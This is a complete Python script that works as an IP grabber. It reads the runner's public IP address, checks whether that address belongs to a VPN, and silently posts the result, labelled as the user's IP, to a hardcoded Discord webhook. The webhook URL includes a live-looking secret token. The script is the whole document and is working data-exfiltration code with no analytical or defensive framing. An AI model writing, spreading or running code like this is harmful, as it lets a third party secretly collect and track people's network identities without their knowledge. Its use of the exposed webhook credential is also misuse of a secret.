import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
IPINFO_TOKEN = ""  # Optional: put your ipinfo.io token here

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException:
        return None

def is_vpn_ip(ip):
    # Compose the appropriate URL for the ipinfo VPN check
    url = f"https://ipinfo.io/{ip}/privacy"
    if IPINFO_TOKEN:
        url += f"?token={IPINFO_TOKEN}"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        # If ipinfo says 'vpn' is true, return True
        return data.get("vpn", False)
    except Exception:
        # If API fails, assume not VPN
        return False

def send_ip_to_discord(ip):
    data = {
        "content": f"User's public IP address: {ip}"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except requests.RequestException:
        pass

def main():
    ip = get_public_ip()
    if ip:
        # Detect VPN status before sending
        if is_vpn_ip(ip):
            ip = f"{ip} (VPN)"
        send_ip_to_discord(ip)

if __name__ == "__main__":
    main()
